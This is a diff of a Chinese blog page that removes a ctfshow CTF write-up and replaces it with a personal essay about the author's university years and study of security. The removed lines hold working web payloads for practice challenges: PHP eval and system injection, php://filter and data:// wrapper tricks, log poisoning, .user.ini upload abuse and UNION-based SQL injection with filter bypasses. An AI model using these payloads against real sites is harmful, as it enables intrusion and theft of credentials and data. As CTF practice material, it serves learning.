@@ -4,13 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow刷题记录, 后来听着风 看着秋 孤独的人总是不会善言辞. jadelin的博客">
-    <meta name="description" content="爆破web21 
-通过抓包发现basic  猜测是base64，解密后得到 admin:admin
-​    
-对于admin:admin抓包，我们设置1的时候把admin:圈上了，所以后面，这里要加一个:
-​    
-顺序也不能乱，先设置">
+    <meta name="keywords" content="2022-6-12, 后来听着风 看着秋 孤独的人总是不会善言辞. jadelin的博客">
+    <meta name="description" content="网安路漫漫，愿与君同行。
+　　正如《纪念》歌中提起的，“时间一转眼就过去了三年一切在我心里开的好皎洁，现在倒计时也不剩几天。”，忆起大学三年恍如昨日一般，记得19年初入校园的那日，我并没有跟别的同学初入大学的那种喜悦之情。我有的只是一股不知">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>ctfshow刷题记录 | jadelin的博客</title>
+    <title>2022-6-12 | jadelin的博客</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/medias/favicon.ico">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -331,7 +327,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow刷题记录</h1>
+                    <h1 class="description center-align post-title">2022-6-12</h1>
                 </div>
             </div>
         </div>
@@ -448,8 +444,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">-web渗透</span>
+                            <a href="/tags/%E6%9D%82%E8%AE%B0/">
+                                <span class="chip bg-color">-杂记</span>
                             </a>
                         
                     </div>
@@ -460,8 +456,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/web%E6%B8%97%E9%80%8F/" class="post-category">
-                                -web渗透
+                            <a href="/categories/%E6%9D%82%E8%AE%B0/" class="post-category">
+                                -杂记
                             </a>
                         
                     </div>
@@ -473,7 +469,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-20
+                    2022-06-12
                 </div>
                 
 
@@ -482,14 +478,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.1k
+                    2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    13 分
+                    6 分
                 </div>
                 
 				
@@ -500,260 +496,16 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p> <img src="1.png"></p>
-<p>通过抓包发现basic  猜测是base64，解密后得到 admin:admin</p>
-<p>​    <img src="2.png"></p>
-<p>对于admin:admin抓包，我们设置1的时候把admin:圈上了，所以后面，这里要加一个:</p>
-<p>​    <img src="3.png"></p>
-<p>顺序也不能乱，先设置 add Suffix: 在设置加密</p>
-<p>​    <img src="4.png"></p>
-<p>查看回显包。</p>
-<p>​    <img src="5.png"></p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a><strong>web29</strong></h2><p>​    <img src="6.png"></p>
-<ol>
-<li><strong>get  c，如果不为flag，去执行c，PHP代码执行c。这个题过滤掉了flag字符。</strong></li>
-<li><strong>?c=phpinfo();     或者 ?c=phpinfo()?&gt;     ?c=system(‘ls’);</strong>   </li>
-<li><strong>c=file_get_contents(“)    ?c=system(“cp flag.php 1.txt”);  ?c=system(“cp fla?.php 1.txt”);</strong>    </li>
-<li><strong>换成？为什么换成? 因为在shell里面 ？站一个占位符，和正则有点相似，*代表多个，？代表一个。</strong></li>
-<li><strong>/1.txt</strong></li>
-</ol>
-<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a><strong>web30</strong></h2><pre><code> &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:  2020-09-04 00:12:34# @Last Modified by:  h1xa# @Last Modified time: 2020-09-04 00:42:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/ 
-                error_reporting(0);
-                if(isset($_GET['c'])){  
-                        $c = $_GET['c'];       
-                        if(!preg_match("/flag|system|php/i", $c)){
-                            eval($c); }
-                }else{
-                            highlight_file(__FILE__);
-                }        
-</code></pre>
-<p>​      </p>
-<ol>
-<li><strong>还是命令执行，多了一个PHP</strong></li>
-<li><strong>/?c=<code>cp fla?.??? 1.txt</code>;</strong></li>
-<li><strong>为什么这样可以？</strong></li>
-<li><strong>反引号 在PHP里面代表的是和system类似的，类似于shell执行。因为这里php过滤了，用？？？占位符代表</strong></li>
-<li><strong>因为知道flag.php——-&gt;fla?.???表示</strong></li>
-</ol>
-<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a><strong>web31</strong></h2><pre><code>&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:  2020-09-04 00:12:34# @Last Modified by:  h1xa# @Last Modified time: 2020-09-04 00:42:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/
-                error_reporting(0);
-                if(isset($_GET['c'])){
-                        $c = $_GET['c'];           
-                        if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
-                        
-                eval($c);
-                }
-                }else{    highlight_file(__FILE__);
-                }              
-</code></pre>
-<ol>
-<li><strong>过滤了很多，用嵌套eval执行</strong></li>
-<li><strong>?c=eval($_GET[1]);&amp;1=phpinfo();    get第一个参数。1相当于参数逃逸出去了不属于c。可以任意使用代码禁掉的关键字。</strong></li>
-<li><strong>?c=eval($_GET[1]);&amp;1=system(‘ls’);     ?c=eval($_GET[1]);&amp;1=system(‘cat flag.php’);</strong></li>
-<li><strong>在php中查看源代码才能看见，</strong> </li>
-<li><strong>倒序，?c=eval($_GET[1]);&amp;1=system(‘tac flag.php’);</strong></li>
-<li><strong>反过来读代码。</strong></li>
-<li><strong>将c参数用一个跳板，把c参数用另一个参数去执行。</strong></li>
-</ol>
-<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a><strong>web32</strong></h2><p>更多过滤，把；和左边的（、`` ， ‘等等都过滤了，用逃逸去做， </p>
-<p>没用空格的情况，用URL编码去绕过，没有；最后一个语句可以不用；</p>
-<p><code>?c=include%0a$_GET[1];&amp;1=/etc/passwd</code> 没有包含成功</p>
-<p><code>?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code>        通过文件包含来读取非PHP的文本文件。</p>
-<p><code>?c=include%0a$_GET[1]?&gt;&amp;1=flag.php</code>  是看不到，虽然包含了，但是没有输出flag的变量。</p>
-<p><code>?c=include%0a$_GET[1]?&gt;</code>因为没又用；分割，所以造成了无法输出。</p>
-<p>文件包含<code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
-<p>使用了一个文件包含的方法，通过base64的编译去读取<code>flag.php</code>。</p>
-<p>伪协议，通过指定的通道，<code>filter通道</code>，通道是base64-encode。</p>
-<p>整体，我读到的资源用base64编码，如果不用base64的话，会看不到源文件的。</p>
-<p>解码。</p>
-<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a><strong>web33</strong></h2><p>多过滤了一个双引号。前面的方法能接出来，用另外一个方法。</p>
-<p><code>?c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code></p>
-<p><code>?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
-<p>思路是一样，用到的代码不同，</p>
-<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a><strong>web34</strong></h2><p>多过滤了一个;为了过滤直接伪协议的参数，</p>
-<p>都过滤了，只能使用语言结构， <code>echo print isset  unset include require</code>常用的语言结构</p>
-<p>这几个语言结构是不用括号的，用</p>
-<p><code>?c=print%0a$_GET[1]?&gt;&amp;1=phpinfo();</code>    结果是php引发的字符，和二进制相似，存在代码空间和数据空间</p>
-<p>二进制里面有代码段，和数据段，这里<code>phpinfo</code>属于数据段，不在代码段，所以执行不了，作为一个字符串来执行。</p>
-<p><code>?c=eval%0a$_GET[1]?&gt;&amp;1=phpinfo();</code> 这里行不通eval在这里必须用括号才能执行，所以eval行不通</p>
-<p>?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd    在这里属于文件读取，不属于代码执行</p>
-<p><code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
-<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a><strong>web35</strong></h2><p>=、&lt;进行了限制。</p>
-<p><code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
-<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a><strong>web36</strong></h2><p>不让用数字了，把1换成a即可</p>
-<p><code>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</code></p>
-<p>字母可以不用’’单引号</p>
-<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a><strong>web37</strong></h2><p><code>?c=$_GET[1]&amp;1=flag.php</code>    属于数据段，包含了字符串，不能解析这个字符串</p>
-<p><code>?c=php://filter/convert.base64-encode/resource=flag.php</code> 不行</p>
-<p><code>?c=data://text/plain</code>,         可以执行，因为data协议，把后面的数字，字符作为php代码去执行。</p>
-<p><code>?c=data://text/plain</code>,          不行</p>
-<p><code>?c=data://text/plain</code>,          不行</p>
-<p><code>?c=data://text/plain</code>,  复制办法，过滤掉了flag字符，用？去占位</p>
-<p><code>data</code>伪协议利用。</p>
-<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a><strong>web38</strong></h2><p>过滤了php和file</p>
-<p><code>?c=data://text/plain</code>,   这种写法不行</p>
-<p><code>?c=data://text/plain</code>,        这种方法，叫做短标签。</p>
-<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a><strong>web39</strong></h2><p>没有回显了，后面强制加了后缀。.php</p>
-<p><code>?c=data://text/plain,.php</code>     完整代码是这样</p>
-<p>下面会出现1.php，phpinfo返回值是1，就是1.php，</p>
-<p><code>?c=data://text/plain,.php</code>    会出现2.php.php</p>
-<p>如果 把.php去掉就出现2.php</p>
-<p><code>?c=data://text/plain,</code>    </p>
-<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a><strong>web40</strong></h2><p>过滤了许多符号，没有过滤字母，没有过滤分号，没有过滤下划线</p>
-<p><code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p>
-<p>​                需要用到的函数 localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.) pos()：返回数组中的当前元素的值。 array_reverse()：数组逆序 scandir()：获取目录下的文件 next()： 函数将内部指针指向数组中的下一个元素，并输出。 首先通过 pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以 scandir(pos(localeconv()))就能得到flag.php了。具体内容如下              </p>
-<p><code>localeconv</code>：是一个包含了与数字和货币有关的区域设置信息的结构体</p>
-<p><code>pos</code>：取这个点</p>
-<p><code>scandir</code>：扫描当前目录</p>
-<p><code>array_reverse</code>：把目录的结果进行翻转</p>
-<p><code>next</code>：取下一个</p>
-<p><code>show_source</code>：显示源码。</p>
-<p>老方法用不成</p>
-<p><code>?c=print_r(get_definde_vars());</code>  打印当前的变量；</p>
-<p>加一个post值，我们要拿到他的字符串phpinfo();能执行这个字符串，就能rce</p>
-<p><code>?c=print_r(next(get_definde_vars()));</code>    拿到了数组，</p>
-<p>对数组进行一个弹出    <code>?c=print_r(array_pop(next(get_definde_vars())));</code></p>
-<p>得到结果phpinfo</p>
-<p><code>?c=eval(array_pop(next(get_definde_vars())));</code>    执行数组；</p>
-<p><code>payload:        ?c=print_r(next(array_reverse(scandir(pos(localeconv())))));</code>        //打印文件</p>
-<p><code>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code>        //highlight读取文件</p>
-<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a><strong>web41</strong></h2><p>过滤了部分字符，数字，字母、`` + 作为一个php代码的执行</p>
-<p>通过特殊字符构造出来一个字母去代码执行。</p>
-<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a><strong>web42</strong></h2><p><code>payload:    ?c= tac f* ||</code></p>
-<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a><strong>web43</strong></h2><p><code>payload:    ?c= tac f* ||</code></p>
-<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a><strong>web44</strong></h2><p>对比上几题，多了一个对flag关键字的过滤，这里可以用通配符*?代替</p>
-<p><code>cat fla?.p?</code>             ?表示一个通配符，            *表示匹配多个通配符</p>
-<p><code>payload:  ?c=tac f* ||</code></p>
-<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a><strong>web45</strong></h2><p>这里对空格进行了过滤，用转义字符%09绕过即可</p>
-<p><code>payload:?c=tac%09f*%09||</code></p>
-<h2 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a><strong>web 46</strong></h2><p><code>payload:        ?c=tac%09fla?.???||</code></p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a><strong>web 78</strong></h2><p>php伪协议，插件利用。</p>
-<p><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
-<p>解密得到的结果。</p>
-<h2 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a><strong>web 79</strong></h2><p>php     data协议，<code>data://text/plain;base64,</code></p>
-<p><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</code></p>
-<p> <img src="7.png"></p>
-<p>大写php 绕过，</p>
-<p><strong>2、日志文件包含：</strong></p>
-<p><strong>访问日志文件记录了服务器收到的每一次请求的</strong></p>
-<p><strong>IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号无法包含其中，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</strong></p>
-<p>访问日志的位置和文件名在不同的系统上会有所差异</p>
-<p>apache一般是<code>/var/log/apache/access.log</code>     nginx的log在<code>/var/log/nginx/access.log</code>和<code>/var/log/nginx/error.log</code>              </p>
-<p>构造：<code>?file=/var/log/nginx/access.log, c</code></p>
-<p>ca成访问</p>
-<p>成功访问。</p>
-<p> <img src="8.png"></p>
-<h2 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a><strong>web 80</strong></h2><p>日志包含</p>
-<p>首先在UA头里面插入一句话</p>
-<p> <img src="9.png"></p>
-<p>接着包含日志文件并利用一句话</p>
-<p><img src="10.png"></p>
-<h2 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a><strong>web 81</strong></h2><p>日志包含</p>
-<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web-151"><a href="#web-151" class="headerlink" title="web 151"></a><strong>web 151</strong></h2><p>抓包改掉后缀直接上传，连接访问。</p>
-<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a><strong>web152</strong></h2><p>抓包改掉后缀直接上传，连接访问。</p>
-<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a><strong>web153</strong></h2><p>使用<code>.user.ini</code>            </p>
-<p>指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code>这两个设置的区别只是在于<code>auto_prepend_file</code>是在文件前插入；<code>auto_append_file</code>在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件</p>
-<p> <strong>上传<code>.user.ini</code>内容为<code>auto_append_file="xxx" xxx</code>为上传文件名字 上传.user.ini文件内容为： <code>GIF89a auto_prepend_file=1.png</code> 然后再上传一句话<code>1.png</code></strong>               </p>
-<p><img src="11.png"></p>
-<p><img src="12.png"></p>
-<p><img src="13.png"></p>
-<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a><strong>web 171</strong></h2><p>//拼接sql语句查找指定ID用户 </p>
-<pre><code>$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";     
-</code></pre>
-<p>​         </p>
-<p>点击查询发现存在三个字段，所以就不用order by 去查询字段了，注意语句闭合。</p>
-<pre><code> 'union select 1,database(),3 --
-
-  'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- +
-
- 'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user' -- qwe
-
- 'union select 1,username,password from ctfshow_user -- qwe     
-
-​         
-</code></pre>
-<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a><strong>web172</strong></h2><p>查询语句</p>
-<p>​       //拼接sql语句查找指定ID用户</p>
-<pre><code> $sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";    
-</code></pre>
-<p>​          </p>
-<p><strong>返回逻辑</strong></p>
-<p>​                //检查结果是否有flag </p>
-<pre><code>   if($row-&gt;username!=='flag'){   
-
-   $ret['msg']='查询成功'; 
-
-   }        
-</code></pre>
-<p>​            </p>
-<p>第 二题看出查询的数据不包含flag，并且给出了数据库是<strong>ctfshow_user2</strong></p>
-<p>从语句中看，判断有两列<code>’union select 1,2 -- +</code> 有回显</p>
-<p><code>payload: 'union select to_base64(username),hex(password) from ctfshow_user2 -- +</code></p>
-<p>最后一行解码是flag</p>
-<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a><strong>web173</strong></h2><p>与172一样，只是173三列都有回显，</p>
-<p><code>payload：'union select 1,hex(username),hex(password) from ctfshow_user3 -- +</code></p>
-<p><code>payload:    'union select 1,to_base64(username),to_base64(password) from ctfshow_user3 where username='flag' limit 1,1 -- A</code></p>
-<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a><strong>web174</strong></h2><p>过滤了不能有数字，</p>
-<p>​       </p>
-<pre><code>         //检查结果是否有flag 
-         if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
-         $ret['msg']='查询成功';
-         }
-         payload:    'union select 1,to_base64(username),to_base64(password) from ctfshow_user3 where username='flag' limit 1,1 -- A
-         替换username: replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ')
-         替换password replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ')  ' union slect replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ') from ctfshow_user4 where username='flag' limit 1,1 -- A         
-</code></pre>
-<p>​    </p>
-<h2 id="web-175"><a href="#web-175" class="headerlink" title="web 175"></a><strong>web 175</strong></h2><p>0-127不让输出，不让输出到页面，</p>
-<p><code>'union select 1,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/ctf.txt' -- A</code></p>
-<h2 id="web-176"><a href="#web-176" class="headerlink" title="web 176"></a><strong>web 176</strong></h2><p>过滤注入，先试一下，看过滤了什么。</p>
-<p><code>' union select 1,2,3 from ctshow_user limit 1 --A</code></p>
-<p>大小写试一下，</p>
-<p><code>' union sElect 1,2,password from ctshow_user where username='flag' limit 1,1 --A</code></p>
-<h2 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a><strong>web 177</strong></h2><p><code>' union select 1,2,3 from ctshow_user limit 1 --A</code></p>
-<p>1’ and 1=1 %23 没有数据</p>
-<p><code>1 ' and (1 = 1)%23</code>没有数据</p>
-<p><code>1'and(1=1)%23</code>有数据</p>
-<p>1’%23有数据</p>
-<p>那就是应该是吧空格给过滤掉了</p>
-<p>反引号也可以作为条件空格。</p>
-<p><code>paylaod：'/**/union/**/select/**/1,2,password/**/from/**/ctshow_user/**/where/**/username='flag'/**/limit/**/1,1/**/%23</code></p>
-<p><code>paylaod：'/**/union/**/select/**/1,2,password/**/fromctshow_userwhereusername='flag'limit/**/1,1/**/%23</code></p>
-<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a><strong>web178</strong></h2><p>在mysql中table键可以作为空格来做    ascii %09为table键</p>
-<p><code>1' or 'a'='a</code>     无数据</p>
-<p>1’or’a’=’a        有数据</p>
-<p>判断还是过滤了空格，</p>
-<p><code>1/**/'or'a'='a</code>    无数据</p>
-<p><code>1/1/'or'a'='a</code>    异常，过滤了<em>号， 绕过</em>号。</p>
-<p><code>1'%09and'a'='a</code>     成功</p>
-<p><code>'%09union%09select%091,2,password%09from%09ctfshow_user%09where username='flag' limit%091,1%09-- A</code></p>
-<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a><strong>web179</strong></h2><p><code>1'%0aand'a'='a</code>    <code>1'%0band'a'='a</code>    1’%0cand’a’=’a        几个换表符号</p>
-<p><code>%0c</code> 能用。</p>
-<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a><strong>web180</strong></h2><p><code>1'%0dand'a'='a</code>    1’%00and’a’=’a测试</p>
-<p>所用空格都给过滤掉了，</p>
-<p><code>id=26</code>因为之前的几个flag都在id中</p>
-<p>直接（）包含一下</p>
-<p>11111报错后面执行。</p>
-<p><code>11111'or(id=26)and'a'='a</code></p>
-<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a><strong>web181</strong></h2><p>跟上面一样。</p>
-<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a><strong>web182</strong></h2><p>跟上面一样</p>
-<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a><strong>web183</strong></h2><p>POST 提交的<code>tableName</code></p>
-<p>hackbar post提交</p>
-<p><code>regexp()</code>正则，</p>
-<p><code>tableName=ctfshow_userwhere pass regexp('fl')</code>     匹配到了数量是一</p>
-<p><code>tableName=ctfshow_userwhere(substr(pass,1,1)regexp('f'))</code></p>
-<p><code>where(substr(pass,1,1)regexp('f'))</code></p>
-<p>tableName=<code>ctfshow_user</code>where(substr(<code>username</code>,1,1)regexp(‘f’))</p>
-<p><code>tableName=ctfshow_userwhere(substr(username,{},1)regexp(\'{}\'))</code></p>
-<p><code>(ctfshow)where(substr(pass,1,1))regexp('f')</code></p>
-<p>flag{0ff62daa-bc2c-4909-bbcc-a849c7e5e46b}</p>
-<p>flag{0ff62daa-bc2c-4909-bbcc-a849c7e5e46b}</p>
-<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a><strong>web184</strong></h2><p>过滤了很多关键字，盲注，时间都过滤了；</p>
-<p><code>tableName=ctfshow_user as a right join ctfshow_user as b on substr(pass,1,1)regexp('f')</code></p>
-<p>单引号突破regexp(chr(0x66))</p>
-<p><code>tableName=ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,1,1)regexp(char(102)))</code></p>
-<p>成功执行。</p>
-
+                <p><strong></strong></p><center><strong>网安路漫漫，愿与君同行。</strong><center><strong></strong><p></p>
+<p>　　正如《纪念》歌中提起的，“时间一转眼就过去了三年一切在我心里开的好皎洁，现在倒计时也不剩几天。”，忆起大学三年恍如昨日一般，记得19年初入校园的那日，我并没有跟别的同学初入大学的那种喜悦之情。我有的只是一股不知怎样提起的感觉，情绪？心情？都没有，有的只是眼中的一片迷茫。我不知道前路在何方，也不知道这三年该怎么去度过，是随波逐流，还是选择另外的一条路。</p>
+<p>　　我还记得，当时开学的第一天，有一个学长主动过来帮我拿行李，我正准备去办理校园网类的东西，学长主动告诉我不要办什么什么，可能学长是为了避免新生掉坑，但是我心里只有一个想法，都读这个school了，感觉一切的一切似乎都不怎么重要。和学长有一句就敷衍一句，当时报学校的时候也是随便报的学校，专业也是随便报的，是跟我高中一个朋友一起报的，可惜他换专业去了电商，我高中的时候对计算机也算是有点点小小了解，就没改专业，（个人比较情怀，比较念旧）在计算机中随便选了一个，也没想过以后会怎么办，应为当时感觉可能以后毕业也不会接触这个行业，甚至也是打算一种在学校混混日子，拿个毕业证的想法。从高中的时候开始，自我感觉我电脑可能比别人稍微微的了解一点，所以我对我的大学专业是真的不报任务希望，感觉可能是在学校里面学不到东西，（初中的时候我就对安全是很感兴趣，苦于是真的听不懂一些原理，只能点点工具，还有一些杂七杂八的原因，其实环境很重要，还有就是氛围。）</p>
+<p>　　大一上半学期时期，当时在东区住的时候跟我在一个宿舍的同班同学有两个，其他的有一个是三班的，还有两个是软件的，还有一个是大数据的。至于课程我是真记不得了，我只记得当时我宿舍的铁铁经常跟我一起逃课，他是只逃数学课，我是很多课都逃，早退迟到，什么的都很经常，从来不早到，也从来不迟退。一直到后来的专业课老师汇报给了辅导员，从此就在辅导员那里上了号，记得当时辅导员对我说了一句，“你还想不想读，不想读就直接给我滚”，一直到毕业都没有迟到，也没有逃过课，也没早退过。当然卡点还是经常有的。其实最主要的还是当时太年轻气盛了，应为当时大一的时候别的课也听不懂，专业课教的是word，ppt，excel，还有打字，我是真的算是吐了。</p>
+<p>　　大一下是疫情期间，疫情期间算是彻底磨炼了我各个方面（之间的具体就不提了，伤心泪）。大二开学去到了新校区，认识了几个其他专业的朋友，就开始了跟他们一起打篮球（虽然我很垃圾）。大二上也就这样混过去了，我真正的改变是在大二下学期，因为一些不方便描述的原因。感觉这样过日子很无趣，一点都不充实，在偶然一次逛b站的时候，看到了有关安全方面的学习视频，看了一集感觉打开了新的世界的大门，以至于大二下学期，一整学期，我都是在学习安全方面的只是，不懂的问题，就在网上找资料补。</p>
+<p>　　也导致那段时间经常熬夜去弄实验，从第一次信息收集用fofa，文件上传绕过，靶场的搭建，sql注入的挑战，xss的实验，期间也刷过ctf类的题目，尝试自己写python的脚本（虽然很垃圾，哈哈），内网靶场的cms到写入shell，校园网后台的进入，校园旁站的测试，看过很多东西，也去试着尝试去了解很多东西，这段时间是大学期间非常充实的一段时间，也是我人生中的一个重要的转折点。在校备赛期间因为停课了，有了更多的时间去弄这些东西。有时候宿舍的室友都睡了我还在弄，图书馆当时去过一起，感觉里面真不是学习的好地方，里面电脑找不到很好的插电的位置，座子也没多少。大多数都是拿着书在记英语，那段时间补了很多知识，也了解到很多书本上，课堂上没有的知识。很遗憾的是，一直到毕业都没有找到一个有学习过安全的同学，甚至有兴趣的也是一个都没有，全都是在敲cisco。</p>
+<p>　　在校期间有过很多想法，想建一个安全社团，但是自我感觉不是那种很厉害的牛人，也不好意思去办，也想办一个论坛，建立一个学习安全的圈子或者是一个学习氛围。后来也没有弄，其实我一直想不懂，学校里面为什么没有人带，没有学长带着弄一些东西，就像是没有传承一样的，感觉很多东西都是自己一个人在学校里面去摸索，去探索，真不是我自大，真感觉好像除了平时上课以外，都接触不到跟专业课方面的知识。学校好像是有一个关于it方面的社团，我没加入过，也不知道是个什么情况，只是后面备赛的时候与别的专业的一些同学接触过一点。</p>
+<p>　　记得在备赛期间，想跟大二的学弟们接触一些，也可怜没有门路，试着与老师接触过，老师感觉不大感兴趣。大学三年总想为学院，为老师们做一点什么，幸运的是，在前几天自己在家倒弄了许久的ctf平台，终于举办了一次线上的ctf比赛，虽然题目都是很简单简单的，对于我来说可能是一个完美的结束。因为心里面总是想去做一些什么，身边的朋友一直说“你管好你你自己，做好你自己就行”，但是在校期间想过很多事情，也想做的很多事情，都没有办成，感觉很遗憾，这次线上比赛的成功举行，对于我来说是最好的结局，算是为大学三年画了一个完美的句号，总算是做成了一件事情，也算是对我大二下学期，那些日日夜夜的证明吧。感谢老师们的悉心指导，也感谢朋友们的一路相随，也谢谢家人对我的支持。当然三年时间是不可能只有这么点的事情，希望下次能继续写下去，文笔很烂，李姐李姐。</p>
+<p>　　写了这么多，期间有过迷茫，也有过很多想法，可能是心比天高，也可能是初学者都是不知者不知所畏。陌生人谢谢你看完了所有字迹，送给你也是送给自己的一句话：前途是光明的 道路是曲折的。</p>
+</center></center>
             </div>
             <hr/>
 
@@ -778,7 +530,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://jadelin.top/2021/10/20/ctfshow-shua-ti-ji-lu/">http://jadelin.top/2021/10/20/ctfshow-shua-ti-ji-lu/</a>
+                    <a href="http://jadelin.top/2022/06/12/2022-06-12/">http://jadelin.top/2022/06/12/2022-06-12/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -816,8 +568,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">-web渗透</span>
+                                <a href="/tags/%E6%9D%82%E8%AE%B0/">
+                                    <span class="chip bg-color">-杂记</span>
                                 </a>
                             
                         </div>
@@ -981,7 +733,7 @@
         repo: '',
         owner: '',
         admin: null,
